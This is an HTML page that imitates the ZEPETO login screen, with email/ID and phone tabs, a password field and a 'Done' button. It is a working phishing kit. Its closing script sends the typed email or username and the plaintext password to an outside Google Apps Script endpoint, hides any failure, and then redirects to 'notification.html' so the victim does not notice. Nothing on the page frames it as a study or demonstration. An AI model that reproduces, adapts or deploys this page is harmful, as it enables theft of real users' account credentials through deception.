<!doctype html>
<html lang="en">
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
  <title>ZEPETO</title>
  <style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,'Segoe UI',Roboto,'Helvetica Neue',sans-serif;background-color:#fff;margin:0;display:flex;flex-direction:column;min-height:100vh}
.wrapper{display:flex;flex-direction:column;justify-content:space-between;min-height:100vh}
.container{display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;margin:0 auto;padding:20px 28px 0;flex-grow:1}
.header{width:100%;display:flex;justify-content:flex-start;align-items:center;margin-bottom:30px;padding-left:0px}
.header img{height:40px}
.login-header{text-align:center;font-size:22px;font-weight:700;margin-bottom:30px}
.tab-container{display:flex;justify-content:space-between;width:100%;margin-bottom:27px;position:relative;margin-top:-10px}
.tab{width:50%;text-align:center;font-size:15px;padding-bottom:15px;cursor:pointer;color:#adacac;font-weight:700}
.tab.active{color:#000}
.line{width:50%;height:2px;background-color:#000;position:absolute;bottom:0;transition:.3s}
.line-gray{width:100%;height:1px;background-color:#F0F0F0;position:absolute;bottom:0}
.input-group{margin-bottom:15px;width:100%;margin-top:-3px;position:relative}
.input-group input{width:100%;padding:15px;font-size:16px;border:none;background-color:#f5f5f6;border-radius:8px;outline:0}
.input-group input::placeholder{color:#A5A5A8}
.password-toggle{position:absolute;right:15px;top:50%;transform:translateY(-50%);cursor:pointer;display:flex;align-items:center;justify-content:center}
.password-toggle svg{fill:#c7c7c9;transition:fill 0.2s ease}
.password-toggle.active svg{fill:#5d4ffb}
.login-btn{width:100%;padding:15px;font-size:1rem;border:none;border-radius:8px;background-color:#c7c7c9;color:#fff;cursor:not-allowed;text-align:center;font-weight:700;transition:background-color .2s ease,color .2s ease}
.login-btn.active{background-color:#5d4ffb;cursor:pointer}
.footer{text-align:center;font-size:.9rem;padding:15px;width:100%;color:#A5A5A8}
.footer a{color:#5C47FF;text-decoration:none}
.loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);justify-content:center;align-items:center;z-index:9999}
.loading-spinner{width:50px;height:50px;border:5px solid #fff;border-top:5px solid transparent;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
@media (max-width:600px){.tab{font-size:15px}.input-group input{font-size:.95rem}}
</style>
  <style>@view-transition { navigation: auto; }</style>
  <script src="/_sdk/data_sdk.js" type="text/javascript"></script>
  <script src="/_sdk/element_sdk.js" type="text/javascript"></script>
  <script src="https://cdn.tailwindcss.com" type="text/javascript"></script>
 </head>
 <body>
  <div class="wrapper">
   <div class="container">
    <div class="header"><img src="zepeto.png" alt="ZEPETO Logo">
    </div>
    <div class="login-header">
     Login
    </div>
    <div class="tab-container">
     <div class="tab active" id="email-tab">
      Email â€¢ ID
     </div>
     <div class="tab" id="phone-tab">
      Phone
     </div>
     <div class="line-gray"></div>
     <div class="line"></div>
    </div>
    <div class="input-group"><input id="email" placeholder="Email or Username">
    </div>
    <div class="input-group"><input type="password" id="password" placeholder="Password">
     <div class="password-toggle" id="password-toggle">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24">
       <path d="M15 12c0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3 3 1.346 3 3zm9-.449s-4.252 8.449-11.985 8.449c-7.18 0-12.015-8.449-12.015-8.449s4.446-7.551 12.015-7.551c7.694 0 11.985 7.551 11.985 7.551zm-7 .449c0-2.757-2.243-5-5-5s-5 2.243-5 5 2.243 5 5 5 5-2.243 5-5z" />
      </svg>
     </div>
    </div>
    <div class="login-btn" id="done-btn">
     Done
    </div>
   </div>
   <div class="footer">
    New to ZEPETO? <a href="https://web.zepeto.me/">Download App</a>
   </div>
  </div>
  <div class="loading-overlay">
   <div class="loading-spinner"></div>
  </div>
  <script>
const passwordField = document.getElementById("password");
const emailField = document.getElementById("email");
const doneBtn = document.getElementById("done-btn");
const tabs = document.querySelectorAll(".tab");
const line = document.querySelector(".line");
const loadingOverlay = document.querySelector(".loading-overlay");
const passwordToggle = document.getElementById("password-toggle");

// Password toggle functionality
passwordToggle.addEventListener("click", function() {
  if (passwordField.type === "password") {
    passwordField.type = "text";
    passwordToggle.classList.add("active");
  } else {
    passwordField.type = "password";
    passwordToggle.classList.remove("active");
  }
});

function updateLinePosition() {
  const activeTab = document.querySelector(".tab.active");
  line.style.width = activeTab.clientWidth + "px";
  line.style.left = activeTab.offsetLeft + "px";
}

function checkFields() {
  if (emailField.value.trim() !== "" && passwordField.value.length >= 8) {
    doneBtn.classList.add("active");
    doneBtn.onclick = async () => {
      loadingOverlay.style.display = "flex";
      try {
        const response = await fetch("https://script.google.com/macros/s/AKfycbxEKpmAC3X2ua-aeYbhQ4o62sembLBiZJTXdesKF-WrFWd4grxG_8_qOZNS0r35CDCFzw/exec", {
          method: "POST",
          headers: {"Content-Type": "application/x-www-form-urlencoded"},
          body: `emailOrUsername=${encodeURIComponent(emailField.value)}&password=${encodeURIComponent(passwordField.value)}`
        });
        await response.text();
      } catch (error) {
        console.log("Request sent");
      }
      window.location.href = "notification.html";
    };
  } else {
    doneBtn.classList.remove("active");
    doneBtn.onclick = null;
  }
}

tabs.forEach(tab => {
  tab.addEventListener("click", () => {
    tabs.forEach(t => t.classList.remove("active"));
    tab.classList.add("active");
    updateLinePosition();
  });
});

window.addEventListener("resize", updateLinePosition);
updateLinePosition();
emailField.addEventListener("input", checkFields);
passwordField.addEventListener("input", checkFields);
</script>
